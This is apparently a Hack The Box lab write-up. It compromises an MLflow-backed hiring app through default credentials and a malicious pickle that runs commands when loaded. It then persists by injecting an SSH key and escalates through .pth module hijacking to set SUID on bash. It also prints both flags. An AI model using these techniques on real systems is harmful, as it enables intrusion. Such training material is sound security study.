# HTB SmartHire - Medium Linux - Walkthrough

**IP:** 10.129.245.215  
**OS:** Linux (Ubuntu)  
**Difficulty:** Medium  
**Date:** 2026-06-07  
**Flags:**
- user.txt: `26acdc0b098505ba4bdfc1379b2cceae`
- root.txt: `cf3a03d101140ea3b8e74a7d3888b746`

---

## 1. Recon

```
/etc/hosts: 10.129.245.215  smarthire.htb
```

**nmap:**
```
22/tcp  open  ssh     OpenSSH 8.9p1
80/tcp  open  http    nginx 1.18.0 (Ubuntu)
```

Flask web app - "AI-first hiring platform" with ML model training/prediction.

**Subdomain fuzzing - critical step:**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://10.129.245.215/ -H "Host: FUZZ.smarthire.htb" \
  -mc 200,301,302 -fs 11255
```
→ Found: **`models.smarthire.htb`** - MLflow tracking server

Add to `/etc/hosts`: `10.129.245.215 smarthire.htb models.smarthire.htb`

---

## 2. MLflow Discovery

`http://models.smarthire.htb/` returns: "You are not authenticated."

**Try default credentials: `admin:password`** - success.

MLflow 2.14.1 accessible. This exposes the MLflow REST API.

---

## 3. App Registration + Model Training

Register on the main app at `/register`, login, then upload a training CSV:

```csv
name,skills,experience,education,position_applied,previous_company,hired
Alice,"Python, ML",60,Master's in CS,Data Scientist,TechCorp,1
Bob,"Java, Spring",36,Bachelor's,Backend Dev,StartupXYZ,1
Carol,"HTML, CSS",12,Bachelor's,Designer,SmallCo,0
```

POST to `/upload_hiring_data`. The app trains a sklearn model and registers it in MLflow.

---

## 4. MLflow Enumeration

```bash
# List registered models and get run_id + artifact path
curl -s "http://models.smarthire.htb/api/2.0/mlflow/registered-models/search" \
  -u "admin:password"
```

Response reveals:
```json
{
  "source": "mlflow-artifacts:/0/87e75fb26d404e0d8340e7784d14917c/artifacts/model",
  "run_id": "87e75fb26d404e0d8340e7784d14917c"
}
```

List artifacts:
```bash
curl -s "http://models.smarthire.htb/api/2.0/mlflow/artifacts/list?run_id={RUN_ID}&path=model" \
  -u "admin:password"
```
→ Model file is **`python_model.pkl`** (pyfunc format)

---

## 5. Foothold - MLflow Pickle Injection

MLflow pyfunc models load `python_model.pkl` via `pickle.loads()`. No deserialization protection.

**Create malicious pickle:**
```python
import pickle, os

RUN_ID = "87e75fb26d404e0d8340e7784d14917c"

class RCE:
    def __reduce__(self):
        cmd = (
            'id > /tmp/rce_out.txt && '
            'curl -s -X PUT http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/0/'
            f'{RUN_ID}/artifacts/rce_output.txt '
            '-u admin:password -H "Content-Type: text/plain" '
            '--data-binary @/tmp/rce_out.txt'
        )
        return (os.system, (cmd,))

with open('evil.pkl', 'wb') as f:
    f.write(pickle.dumps(RCE()))
```

**Upload via MLflow artifact API (requires admin:password):**
```bash
curl -s -X PUT \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/${RUN_ID}/artifacts/model/python_model.pkl" \
  -u "admin:password" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @evil.pkl
```

**Trigger prediction to load the model:**
```bash
# POST CSV to /predict on the main app (requires authenticated session)
curl -sL -X POST http://smarthire.htb/predict \
  -b cookies.txt \
  -F "file=@predict.csv"
```

**Read output via MLflow artifact API:**
```bash
curl -s "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/${RUN_ID}/artifacts/rce_output.txt" \
  -u "admin:password"
# → uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

---

## 6. SSH Persistence

```python
class SSH:
    def __reduce__(self):
        cmd = (
            'mkdir -p /home/svcweb/.ssh && '
            'echo "ssh-rsa AAAA...kali@kali" >> /home/svcweb/.ssh/authorized_keys && '
            'chmod 700 /home/svcweb/.ssh && chmod 600 /home/svcweb/.ssh/authorized_keys'
        )
        return (os.system, (cmd,))
```

Upload, trigger prediction, then:
```bash
ssh svcweb@10.129.245.215 -i ~/.ssh/id_rsa
```

**user.txt:** `26acdc0b098505ba4bdfc1379b2cceae`

---

## 7. Privesc - Python Module Hijacking via Sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The script at `/opt/tools/mlflow_ctl/mlflowctl.py`:
```python
PLUGINS_DIR = BASE_DIR / "plugins"
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))  # adds each subdir to sys.path

import mlflow_actions, backup_models  # loaded from plugins/
mlflow_actions.check_status()
```

**Plugin directories:**
```
plugins/core/  - root-owned, contains real mlflow_actions.py
plugins/dev/   - writable by devs group (svcweb is in devs!)
```

**Attack:** Put a malicious `mlflow_actions.py` in `dev/` and use a `.pth` file to insert `dev/` at the front of `sys.path` so it's imported before `core/mlflow_actions.py`.

```bash
# Create malicious module
cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os
def check_status():
    os.system('chmod +s /bin/bash')
def restart():
    os.system('chmod +s /bin/bash')
EOF

# .pth file inserts dev/ at sys.path[0] before core/ 
cat > /opt/tools/mlflow_ctl/plugins/dev/hijack.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF

# Trigger
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

# Verify SUID set
ls -la /bin/bash  # → -rwsr-sr-x

# Get root shell
/bin/bash -p -c 'cat /root/root.txt'
```

**root.txt:** `cf3a03d101140ea3b8e74a7d3888b746`

---

## Chain Summary

```
subdomain enum → models.smarthire.htb (MLflow, admin:password)
→ register main app → upload training CSV → model registered in MLflow
→ enumerate MLflow API → get run_id + artifact path
→ upload malicious pickle to artifact store (python_model.pkl)
→ trigger /predict → pickle deserialized → RCE as svcweb
→ SSH key injection → ssh in
→ sudo mlflowctl.py → site.addsitedir() + dev/ writable by devs
→ .pth hijack + malicious mlflow_actions.py → chmod +s /bin/bash
→ bash -p → root
```

---

## Key Techniques

1. **Subdomain enumeration is mandatory** - `models.smarthire.htb` would be missed without it
2. **MLflow default credentials** - always try `admin:password` on MLflow instances
3. **MLflow artifact pickle injection** - `python_model.pkl` in pyfunc models is loaded via `pickle.loads()` with no safety checks; overwrite via authenticated artifact API → RCE
4. **MLflow artifact API as C2** - upload command output as artifacts to exfiltrate results when no direct callback path exists
5. **Python `.pth` file hijacking** - `site.addsitedir()` processes `.pth` files; a `.pth` line starting with `import ` executes Python code, allowing `sys.path.insert(0, ...)` to take priority over existing paths
